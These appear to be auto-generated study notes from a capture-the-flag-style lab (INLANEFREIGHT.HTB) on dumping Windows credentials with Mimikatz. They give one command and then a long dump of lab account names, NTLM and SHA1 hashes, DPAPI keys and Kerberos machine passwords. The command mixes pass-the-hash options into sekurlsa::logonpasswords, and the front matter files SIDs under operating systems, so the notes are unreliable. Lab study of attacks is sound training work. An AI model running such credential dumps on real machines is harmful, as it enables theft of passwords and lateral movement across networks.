---
title: mimikatz usage and output
aliases: []
tags:
- tool/mimikatz
category: study_notes
status: draft
date_created: '2026-08-26'
date_modified: '2026-08-26'
source: mimikatz.md
related_tools:
- '[[mimikatz]]'
related_techniques:
- '[[t1003-003]]'
related_tactics:
- '[[t1132]]'
related_services: []
related_os:
- '[[sekurlsa::logonpasswords]]'
- '[[S-1-5-21-430213916-1543111962-1809483319-500]]'
- '[[S-1-5-90-0-2]]'
- '[[S-1-5-21-3325992272-2815718403-617452758-1108]]'
- '[[S-1-5-21-3325992272-2815718403-617452758-1106]]'
- '[[S-1-5-17]]'
- '[[S-1-5-19]]'
- '[[S-1-5-90-0-1]]'
- '[[S-1-5-18]]'
- '[[MS01$]]'
- '[[INLANEFREIGHT]]'
- '[[INLANEFREIGHT.HTB]]'
related_notes: []
mitre_tactic: ''
mitre_technique: ''
real_path: ''
port: ''
protocol: ''
os: ''
---

# mimikatz usage and output

## Description
This section describes the process of running Mimikatz as a standard user and an administrator to demonstrate the differences in the information retrieved.

## Usage
```sh
run as
- standard user gets only your tickets
- administrator gets everything
```

This command is used to specify the user context in which Mimikatz will run. A standard user will only have access to their own tickets, while an administrator will have access to all tickets.

## Command Execution
```sh
mimikatz.exe privilege::debug "sekurlsa::logonpasswords /user:Administrator /rc4:$hash /domain:ms01" exit
```

This command is executed to dump the logon passwords for the specified user and domain. The output includes various authentication methods such as MSV, TSPKG, Wdigest, Kerberos, and SSP.

## Output
```sh
Authentication Id : 0 ; 1188579 (00000000:001222e3)
Session           : NewCredentials from 0
User Name         : Administrator
Domain            : MS01
Logon Server      : (null)
Logon Time        : 11/27/2024 11:34:51 PM
SID               : S-1-5-21-430213916-1543111962-1809483319-500
	msv : 
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : ms01
	 * NTLM     : 30b3783ce2abf1af70f77d0660cf3453

tspkg : 

wdigest : 
	 * Username : Administrator
	 * Domain   : ms01
	 * Password : (null)

kerberos : 
	 * Username : Administrator
	 * Domain   : ms01
	 * Password : (null)

ssp : 

credman : 


Authentication Id : 0 ; 648198 (00000000:0009e406)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 11/27/2024 11:23:57 PM
SID               : S-1-5-90-0-2
	msv : 
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : INLANEFREIGHT
	 * NTLM     : 5d8ddb4ca58568092464ace65e39d530
	 * SHA1     : 7e0c52604c5fbaff1adf73682fd2dd8f0380a06b

tspkg : 

wdigest : 
	 * Username : MS01$
	 * Domain   : INLANEFREIGHT
	 * Password : (null)

kerberos : 
	 * Username : MS01$
	 * Domain   : inlanefreight.htb
	 * Password : 34 1f 71 b4 fe 0a 36 10 d8 72 40 e3 30 3b 3a 3a 04 03 50 50 8b 69 33 8c 01 f4 fc b3 5b ab 26 2c 5f 49 5d 54 75 00 38 77 fe 0a a3 9a c3 f9 d2 03 39 e5 24 fb e7 9c 22 17 d3 e2 dd dc e0 8c 1e f3 e3 20 61 8d 8c 9b 37 d6 28 42 92 07 e3 39 4f 0d 35 1e c9 a1 fd 84 13 70 27 ce 76 ee eb 23 0f 7b e5 8f b3 1f 7a 51 fa b5 5b 21 4a 79 af 69 9e dd 9a 6f 99 54 04 ab 51 85 8d 68 42 76 3a 87 ef 1b c2 77 73 2a e2 51 f7 d3 55 70 03 f7 ab c0 b4 d9 4c 52 0f 7b 03 11 8b f7 91 91 03 85 56 fa 49 ee 39 e8 e9 64 dd bd c3 db c0 25 6e ee 40 c6 f2 30 d1 6d 5a 3b 20 c1 6b e8 a8 8c 1d 77 c0 34 69 8b 81 bd bc 62 f7 b1 aa 26 fd b8 61 c6 7c 25 1c b2 0d 5e 57 42 35 be 23 46 b5 28 24 bb 76 18 79 1e f1 6c e8 7f 43 31 a6 68 f0 c9 7c 6f ed a4 a3 d6 

ssp : 

credman : 


Authentication Id : 0 ; 646583 (00000000:0009ddb7)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 11/27/2024 11:23:57 PM
SID               : S-1-5-96-0-2
	msv : 
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : INLANEFREIGHT
	 * NTLM     : 5d8ddb4ca58568092464ace65e39d530
	 * SHA1     : 7e0c52604c5fbaff1adf73682fd2dd8f0380a06b

tspkg : 

wdigest : 
	 * Username : MS01$
	 * Domain   : INLANEFREIGHT
	 * Password : (null)

kerberos : 
	 * Username : MS01$
	 * Domain   : inlanefreight.htb
	 * Password : 34 1f 71 b4 fe 0a 36 10 d8 72 40 e3 30 3b 3a 3a 04 03 50 50 8b 69 33 8c 01 f4 fc b3 5b ab 26 2c 5f 49 5d 54 75 00 38 77 fe 0a a3 9a c3 f9 d2 03 39 e5 24 fb e7 9c 22 17 d3 e2 dd dc e0 8c 1e f3 e3 20 61 8d 8c 9b 37 d6 28 42 92 07 e3 39 4f 0d 35 1e c9 a1 fd 84 13 70 27 ce 76 ee eb 23 0f 7b e5 8f b3 1f 7a 51 fa b5 5b 21 4a 79 af 69 9e dd 9a 6f 99 54 04 ab 51 85 8d 68 42 76 3a 87 ef 1b c2 77 73 2a e2 51 f7 d3 55 70 03 f7 ab c0 b4 d9 4c 52 0f 7b 03 11 8b f7 91 91 03 85 56 fa 49 ee 39 e8 e9 64 dd bd c3 db c0 25 6e ee 40 c6 f2 30 d1 6d 5a 3b 20 c1 6b e8 a8 8c 1d 77 c0 34 69 8b 81 bd bc 62 f7 b1 aa 26 fd b8 61 c6 7c 25 1c b2 0d 5e 57 42 35 be 23 46 b5 28 24 bb 76 18 79 1e f1 6c e8 7f 43 31 a6 68 f0 c9 7c 6f ed a4 a3 d6 

ssp : 

credman : 


Authentication Id : 0 ; 435462 (00000000:0006a506)
Session           : Service from 0
User Name         : MSSQL$MICROSOFT##WID
Domain            : NT SERVICE
Logon Server      : (null)
Logon Time        : 11/27/2024 11:16:47 PM
SID               : S-1-5-80-1184457765-4068085190-3456807688-2200952327-3769537534
	msv : 
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : INLANEFREIGHT
	 * NTLM     : 5d8ddb4ca58568092464ace65e39d530
	 * SHA1     : 7e0c52604c5fbaff1adf73682fd2dd8f0380a06b

tspkg : 

wdigest : 
	 * Username : MS01$
	 * Domain   : INLANEFREIGHT
	 * Password : (null)

kerberos : 
	 * Username : MS01$
	 * Domain   : inlanefreight.htb
	 * Password : 34 1f 71 b4 fe 0a 36 10 d8 72 40 e3 30 3b 3a 3a 04 03 50 50 8b 69 33 8c 01 f4 fc b3 5b ab 26 2c 5f 49 5d 54 75 00 38 77 fe 0a a3 9a c3 f9 d2 03 39 e5 24 fb e7 9c 22 17 d3 e2 dd dc e0 8c 1e f3 e3 20 61 8d 8c 9b 37 d6 28 42 92 07 e3 39 4f 0d 35 1e c9 a1 fd 84 13 70 27 ce 76 ee eb 23 0f 7b e5 8f b3 1f 7a 51 fa b5 5b 21 4a 79 af 69 9e dd 9a 6f 99 54 04 ab 51 85 8d 68 42 76 3a 87 ef 1b c2 77 73 2a e2 51 f7 d3 55 70 03 f7 ab c0 b4 d9 4c 52 0f 7b 03 11 8b f7 91 91 03 85 56 fa 49 ee 39 e8 e9 64 dd bd c3 db c0 25 6e ee 40 c6 f2 30 d1 6d 5a 3b 20 c1 6b e8 a8 8c 1d 77 c0 34 69 8b 81 bd bc 62 f7 b1 aa 26 fd b8 61 c6 7c 25 1c b2 0d 5e 57 42 35 be 23 46 b5 28 24 bb 76 18 79 1e f1 6c e8 7f 43 31 a6 68 f0 c9 7c 6f ed a4 a3 d6 

ssp : 

credman : 
```

The output shows various authentication methods and their corresponding credentials for different user accounts and services.

## Authentication Details
Authentication Id : 0 ; 428374 (00000000:00068956)
Session           : Service from 0
User Name         : david
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 11/27/2024 11:15:47 PM
SID               : S-1-5-21-3325992272-2815718403-617452758-1107
    msv :    
    [00000003] Primary
    * Username : david
    * Domain   : INLANEFREIGHT
    * NTLM     : c39f2beb3d2ec06a62cb887fb391dee0
    * SHA1     : 2277c28035275149d01a8de530cc13b74f59edfb
    * DPAPI    : eaa6db50c1544304014d858928d9694f
    tspkg :    
    wdigest :    
    * Username : david
    * Domain   : INLANEFREIGHT
    * Password : (null)
    kerberos :    
    * Username : david
    * Domain   : INLANEFREIGHT.HTB
    * Password : (null)
    ssp :    
    credman :    

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : MS01$
Domain            : INLANEFREIGHT
Logon Server      : (null)
Logon Time        : 11/27/2024 11:14:44 PM
SID               : S-1-5-20
    msv :    
    [00000003] Primary
    * Username : MS01$
    * Domain   : INLANEFREIGHT
    * NTLM     : 5d8ddb4ca58568092464ace65e39d530
    * SHA1     : 7e0c52604c5fbaff1adf73682fd2dd8f0380a06b
    tspkg :    
    wdigest :    
    * Username : MS01$
    * Domain   : INLANEFREIGHT
    * Password : (null)
    kerberos :    
    * Username : ms01$
    * Domain   : INLANEFREIGHT.HTB
    * Password : 34 1f 71 b4 fe 0a 36 10 d8 72 40 e3 30 3b 3a 3a 04 03 50 50 8b 69 33 8c 01 f4 fc b3 5b ab 26 2c 5f 49 5d 54 75 00 38 77 fe 0a a3 9a c3 f9 d2 03 39 e5 24 fb e7 9c 22 17 d3 e2 dd dc e0 8c 1e f3 e3 20 61 8d 8c 9b 37 d6 28 42 92 07 e3 39 4f 0d 35 1e c9 a1 fd 84 13 70 27 ce 76 ee eb 23 0f 7b e5 8f b3 1f 7a 51 fa b5 5b 21 4a 79 af 69 9e dd 9a 6f 99 54 04 ab 51 85 8d 68 42 76 3a 87 ef 1b c2 77 73 2a e2 51 f7 d3 55 70 03 f7 ab c0 b4 d9 4c 52 0f 7b 03 11 8b f7 91 91 03 85 56 fa 49 ee 39 e8 e9 64 dd bd c3 db c0 25 6e ee 40 c6 f2 30 d1 6d 5a 3b 20 c1 6b e8 a8 8c 1d 77 c0 34 69 8b 81 bd bc 62 f7 b1 aa 26 fd b8 61 c6 7c 25 1c b2 0d 5e 57 42 35 be 23 46 b5 28 24 bb 76 18 79 1e f1 6c e8 7f 43 31 a6 68 f0 c9 7c 6f ed a4 a3 d6 
    ssp :    
    credman :    

Authentication Id : 0 ; 43049 (00000000:0000a829)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 11/27/2024 11:14:44 PM
SID               : S-1-5-96-0-1
    msv :    
    [00000003] Primary
    * Username : MS01$
    * Domain   : INLANEFREIGHT
    * NTLM     : 5d8ddb4ca58568092464ace65e39d530
    * SHA1     : 7e0c52604c5fbaff1adf73682fd2dd8f0380a06b
    tspkg :    
    wdigest :    
    * Username : MS01$
    * Domain   : INLANEFREIGHT
    * Password : (null)
    kerberos :    
    * Username : MS01$
    * Domain   : inlanefreight.htb
    * Password : 34 1f 71 b4 fe 0a 36 10 d8 72 40 e3 30 3b 3a 3a 04 03 50 50 8b 69 33 8c 01 f4 fc b3 5b ab 26 2c 5f 49 5d 54 75 00 38 77 fe 0a a3 9a c3 f9 d2 03 39 e5 24 fb e7 9c 22 17 d3 e2 dd dc e0 8c 1e f3 e3 20 61 8d 8c 9b 37 d6 28 42 92 07 e3 39 4f 0d 35 1e c9 a1 fd 84 13 70 27 ce 76 ee eb 23 0f 7b e5 8f b3 1f 7a 51 fa b5 5b 21 4a 79 af 69 9e dd 9a 6f 99 54 04 ab 51 85 8d 68 42 76 3a 87 ef 1b c2 77 73 2a e2 51 f7 d3 55 70 03 f7 ab c0 b4 d9 4c 52 0f 7b 03 11 8b f7 91 91 03 85 56 fa 49 ee 39 e8 e9 64 dd bd c3 db c0 25 6e ee 40 c6 f2 30 d1 6d 5a 3b 20 c1 6b e8 a8 8c 1d 77 c0 34 69 8b 81 bd bc 62 f7 b1 aa 26 fd b8 61 c6 7c 25 1c b2 0d 5e 57 42 35 be 23 46 b5 28 24 bb 76 18 79 1e f1 6c e8 7f 43 31 a6 68 f0 c9 7c 6f ed a4 a3 d6 
    ssp :    
    credman :    

Authentication Id : 0 ; 43041 (00000000:0000a821)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 11/27/2024 11:14:44 PM
SID               : S-1-5-96-0-0
    msv :    
    [00000003] Primary
    * Username : MS01$
    * Domain   : INLANEFREIGHT
    * NTLM     : 5d8ddb4ca58568092464ace65e39d530
    * SHA1     : 7e0c52604c5fbaff1adf73682fd2dd8f0380a06b
    tspkg :    
    wdigest :    
    * Username : MS01$
    * Domain   : INLANEFREIGHT
    * Password : (null)
    kerberos :    
    * Username : MS01$
    * Domain   : inlanefreight.htb
    * Password : 34 1f 71 b4 fe 0a 36 10 d8 72 40 e3 30 3b 3a 3a 04 03 50 50 8b 69 33 8c 01 f4 fc b3 5b ab 26 2c 5f 49 5d 54 75 00 38 77 fe 0a a3 9a c3 f9 d2 03 39 e5 24 fb e7 9c 22 17 d3 e2 dd dc e0 8c 1e f3 e3 20 61 8d 8c 9b 37 d6 28 42 92 07 e3 39 4f 0d 35 1e c9 a1 fd 84 13 70 27 ce 76 ee eb 23 0f 7b e5 8f b3 1f 7a 51 fa b5 5b 21 4a 79 af 69 9e dd 9a 6f 99 54 04 ab 51 85 8d 68 42 76 3a 87 ef 1b c2 77 73 2a e2 51 f7 d3 55 70 03 f7 ab c0 b4 d9 4c 52 0f 7b 03 11 8b f7 91 91 03 85 56 fa 49 ee 39 e8 e9 64 dd bd c3 db c0 25 6e ee 40 c6 f2 30 d1 6d 5a 3b 20 c1 6b e8 a8 8c 1d 77 c0 34 69 8b 81 bd bc 62 f7 b1 aa 26 fd b8 61 c6 7c 25 1c b2 0d 5e 57 42 35 be 23 46 b5 28 24 bb 76 18 79 1e f1 6c e8 7f 43 31 a6 68 f0 c9 7c 6f ed a4 a3 d6 
    ssp :    
    credman :    

Authentication Id : 0 ; 41952 (00000000:0000a3e0)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 11/27/2024 11:14:44 PM
SID               :

Authentication Id : 0 ; 668957 (00000000:000a351d)
Session           : RemoteInteractive from 2
User Name         : Administrator
Domain            : MS01
Logon Server      : (null)
Logon Time        : 11/27/2024 11:23:57 PM
SID               : S-1-5-21-430213916-1543111962-1809483319-500
    msv :    
    [00000003] Primary
    * Username : MS01$
    * Domain   : INLANEFREIGHT
    * NTLM     : 5d8ddb4ca58568092464ace65e39d530
    * SHA1     : 7e0c52604c5fbaff1adf73682fd2dd8f0380a06b
    tspkg :    
    wdigest :    
    * Username : MS01$
    * Domain   : INLANEFREIGHT
    * Password : (null)
    kerberos :    
    * Username : MS01$
    * Domain   : inlanefreight.htb
    * Password : 34 1f 71 b4 fe 0a 36 10 d8 72 40 e3 30 3b 3a 3a 04 03 50 50 8b 69 33 8c 01 f4 fc b3 5b ab 26 2c 5f 49 5d 54 75 00 38 77 fe 0a a3 9a c3 f9 d2 03 39 e5 24 fb e7 9c 22 17 d3 e2 dd dc e0 8c 1e f3 e3 20 61 8d 8c 9b 37 d6 28 42 92 07 e3 39 4f 0d 35 1e c9 a1 fd 84 13 70 27 ce 76 ee eb 23 0f 7b e5 8f b3 1f 7a 51 fa b5 5b 21 4a 79 af 69 9e dd 9a 6f 99 54 04 ab 51 85 8d 68 42 76 3a 87 ef 1b c2 77 73 2a e2 51 f7 d3 55 70 03 f7 ab c0 b4 d9 4c 52 0f 7b 03 11 8b f7 91 91 03 85 56 fa 49 ee 39 e8 e9 64 dd bd c3 db c0 25 6e ee 40 c6 f2 30 d1 6d 5a 3b 20 c1 6b e8 a8 8c 1d 77 c0 34 69 8b 81 bd bc 62 f7 b1 aa 26 fd b8 61 c6 7c 25 1c b2 0d 5e 57 42 35 be 23 46 b5 28 24 bb 76 18 79 1e f1 6c e8 7f 43 31 a6 68 f0 c9 7c 6f ed a4 a3 d6
    ssp :    
    credman :    

Authentication Id : 0 ; 648168 (00000000:0009e3e8)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 11/27/2024 11:23:57 PM
SID               : S-1-5-90-0-2
    msv :    
    [00000003] Primary
    * Username : MS01$
    * Domain   : INLANEFREIGHT
    * NTLM     : 5d8ddb4ca58568092464ace65e39d530
    * SHA1     : 7e0c52604c5fbaff1adf73682fd2dd8f0380a06b
    tspkg :    
    wdigest :    
    * Username : MS01$
    * Domain   : INLANEFREIGHT
    * Password : (null)
    kerberos :    
    * Username : MS01$
    * Domain   : inlanefreight.htb
    * Password : 34 1f 71 b4 fe 0a 36 10 d8 72 40 e3 30 3b 3a 3a 04 03 50 50 8b 69 33 8c 01 f4 fc b3 5b ab 26 2c 5f 49 5d 54 75 00 38 77 fe 0a a3 9a c3 f9 d2 03 39 e5 24 fb e7 9c 22 17 d3 e2 dd dc e0 8c 1e f3 e3 20 61 8d 8c 9b 37 d6 28 42 92 07 e3 39 4f 0d 35 1e c9 a1 fd 84 13 70 27 ce 76 ee eb 23 0f 7b e5 8f b3 1f 7a 51 fa b5 5b 21 4a 79 af 69 9e dd 9a 6f 99 54 04 ab 51 85 8d 68 42 76 3a 87 ef 1b c2 77 73 2a e2 51 f7 d3 55 70 03 f7 ab c0 b4 d9 4c 52 0f 7b 03 11 8b f7 91 91 03 85 56 fa 49 ee 39 e8 e9 64 dd bd c3 db c0 25 6e ee 40 c6 f2 30 d1 6d 5a 3b 20 c1 6b e8 a8 8c 1d 77 c0 34 69 8b 81 bd bc 62 f7 b1 aa 26 fd b8 61 c6 7c 25 1c b2 0d 5e 57 42 35 be 23 46 b5 28 24 bb 76 18 79 1e f1 6c e8 7f 43 31 a6 68 f0 c9 7c 6f ed a4 a3 d6
    ssp :    
    credman :    

Authentication Id : 0 ; 425959 (00000000:00067fe7)
Session           : Service from 0
User Name         : john
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 11/27/2024 11:15:47 PM
SID               : S-1-5-21-3325992272-2815718403-617452758-1108
    msv :    
    [00000003] Primary
    * Username : john
    * Domain   : INLANEFREIGHT
    * NTLM     : c4b0e1b10c7ce2c4723b4e2407ef81a2
    * SHA1     : 31f8f4dfcb16205363b35055ebe92a75f0a19ce3
    * DPAPI    : 2e54e60846c83d96cf8d9523b5c0df61
    tspkg :    
    wdigest :    
    * Username : john
    * Domain   : INLANEFREIGHT
    * Password : (null)
    kerberos :    
    * Username : john
    * Domain   : INLANEFREIGHT.HTB
    * Password : (null)
    ssp :    
    credman :    

Authentication Id : 0 ; 423492 (00000000:00067644)
Session           : Service from 0
User Name         : julio
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 11/27/2024 11:15:46 PM
SID               : S-1-5-21-3325992272-2815718403-617452758-1106
    msv :    
    [00000003] Primary
    * Username : julio
    * Domain   : INLANEFREIGHT
    * NTLM     : 64f12cddaa88057e06a81b54e73b949b
    * SHA1     : cba4e545b7ec918129725154b29f055e4cd5aea8
    * DPAPI    : 634db497baef212b777909a4ccaaf700
    tspkg :    
    wdigest :    
    * Username : julio
    * Domain   : INLANEFREIGHT
    * Password : (null)
    kerberos :    
    * Username : julio
    * Domain   : INLANEFREIGHT.HTB
    * Password : (null)
    ssp :    
    credman :    

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 11/27/2024 11:14:46 PM
SID               : S-1-5-17
    msv :    
    tspkg :    
    wdigest :    
    * Username : (null)
    * Domain   : (null)
    * Password : (null)
    kerberos :    
    ssp :    
    credman :    

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 11/27/2024 11:14:45 PM
SID               : S-1-5-19
    msv :    
    tspkg :    
    wdigest :    
    * Username : (null)
    * Domain   : (null)
    * Password : (null)
    kerberos :    
    * Username : (null)
    * Domain   : (null)
    * Password : (null)
    ssp :    
    credman :

Authentication Id : 0 ; 72833 (00000000:00011c81)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 11/27/2024 11:14:45 PM
SID               : S-1-5-90-0-1
    msv :    [00000003] Primary
    * Username : MS01$
    * Domain   : INLANEFREIGHT
    * NTLM     : ae69915f688e415aaa4abae2a247e892
    * SHA1     : ee294bec9d036ef57db2da1e0a6aa95e3d3a2e3f
tspkg : 
wdigest :    * Username : MS01$
    * Domain   : INLANEFREIGHT
    * Password : (null)
kerberos :    * Username : MS01$
    * Domain   : inlanefreight.htb
    * Password : ac 97 cc b6 e7 ae 88 e1 05 f1 0a b4 9b 2e 6b 62 98 6d 71 23 00 e6 44 96 0d 74 6e d5 f7 b6 4c 2d a3 79 9a 0e a8 60 e1 40 96 38 10 e4 33 be a9 22 09 15 e2 1b 4f 2a 0d d5 21 56 2a 3e 81 0d 42 f8 cf 3b 30 51 b5 22 44 32 b8 c5 de 23 d3 6d 3a 3b 52 3e 18 07 04 c2 61 1b 74 ae b9 be 7c 69 a3 93 0f 9b 85 c1 09 35 39 9d b9 70 dc ab 9b c6 49 23 3d 57 e4 a5 92 d9 81 cc ff 6d df fa 13 22 87 77 eb c9 0e 3d a3 77 7c d4 8e dc 94 43 6d ce 2c 37 51 f4 d3 1b 73 d6 e8 e4 ca 0f ba 55 57 da ba a4 e1 dc 81 81 41 49 63 ec 6d f7 42 5d e0 d7 11 65 10 09 bf 80 79 8b fa f2 cd ac 46 e2 7a aa dc 9d 1a ff e7 ec ba c4 86 3c 26 8c a2 c7 05 63 0e 2b b3 f6 84 0d 65 5e b9 aa 23 6a de 6a 58 85 a3 54 52 45 17 84 08 a0 06 79 4e 39 53 9d db 85 dc fd
    ssp : 
    credman : 

Authentication Id : 0 ; 72815 (00000000:00011c6f)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 11/27/2024 11:14:45 PM
SID               : S-1-5-90-0-1
    msv :    [00000003] Primary
    * Username : MS01$
    * Domain   : INLANEFREIGHT
    * NTLM     : 5d8ddb4ca58568092464ace65e39d530
    * SHA1     : 7e0c52604c5fbaff1adf73682fd2dd8f0380a06b
tspkg : 
wdigest :    * Username : MS01$
    * Domain   : INLANEFREIGHT
    * Password : (null)
kerberos :    * Username : MS01$
    * Domain   : inlanefreight.htb
    * Password : 34 1f 71 b4 fe 0a 36 10 d8 72 40 e3 30 3b 3a 3a 04 03 50 50 8b 69 33 8c 01 f4 fc b3 5b ab 26 2c 5f 49 5d 54 75 00 38 77 fe 0a a3 9a c3 f9 d2 03 39 e5 24 fb e7 9c 22 17 d3 e2 dd dc e0 8c 1e f3 e3 20 61 8d 8c 9b 37 d6 28 42 92 07 e3 39 4f 0d 35 1e c9 a1 fd 84 13 70 27 ce 76 ee eb 23 0f 7b e5 8f b3 1f 7a 51 fa b5 5b 21 4a 79 af 69 9e dd 9a 6f 99 54 04 ab 51 85 8d 68 42 76 3a 87 ef 1b c2 77 73 2a e2 51 f7 d3 55 70 03 f7 ab c0 b4 d9 4c 52 0f 7b 03 11 8b f7 91 91 03 85 56 fa 49 ee 39 e8 e9 64 dd bd c3 db c0 25 6e ee 40 c6 f2 30 d1 6d 5a 3b 20 c1 6b e8 a8 8c 1d 77 c0 34 69 8b 81 bd bc 62 f7 b1 aa 26 fd b8 61 c6 7c 25 1c b2 0d 5e 57 42 35 be 23 46 b5 28 24 bb 76 18 79 1e f1 6c e8 7f 43 31 a6 68 f0 c9 7c 6f ed a4 a3 d6
    ssp : 
    credman : 

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : MS01$
Domain            : INLANEFREIGHT
Logon Server      : (null)
Logon Time        : 11/27/2024 11:14:44 PM
SID               : S-1-5-18
    msv : 
tspkg : 
wdigest :    * Username : MS01$
    * Domain   : INLANEFREIGHT
    * Password : (null)
kerberos :    * Username : ms01$
    * Domain   : INLANEFREIGHT.HTB
    * Password : 34 1f 71 b4 fe 0a 36 10 d8 72 40 e3 30 3b 3a 3a 04 03 50 50 8b 69 33 8c 01 f4 fc b3 5b ab 26 2c 5f 49 5d 54 75 00 38 77 fe 0a a3 9a c3 f9 d2 03 39 e5 24 fb e7 9c 22 17 d3 e2 dd dc e0 8c 1e f3 e3 20 61 8d 8c 9b 37 d6 28 42 92 07 e3 39 4f 0d 35 1e c9 a1 fd 84 13 70 27 ce 76 ee eb 23 0f 7b e5 8f b3 1f 7a 51 fa b5 5b 21 4a 79 af 69 9e dd 9a 6f 99 54 04 ab 51 85 8d 68 42 76 3a 87 ef 1b c2 77 73 2a e2 51 f7 d3 55 70 03 f7 ab c0 b4 d9 4c 52 0f 7b 03 11 8b f7 91 91 03 85 56 fa 49 ee 39 e8 e9 64 dd bd c3 db c0 25 6e ee 40 c6 f2 30 d1 6d 5a 3b 20 c1 6b e8 a8 8c 1d 77 c0 34 69 8b 81 bd bc 62 f7 b1 aa 26 fd b8 61 c6 7c 25 1c b2 0d 5e 57 42 35 be 23 46 b5 28 24 bb 76 18 79 1e f1 6c e8 7f 43 31 a6 68 f0 c9 7c 6f ed a4 a3 d6
    ssp : 
    credman : 

mimikatz(commandline) # exit
Bye!

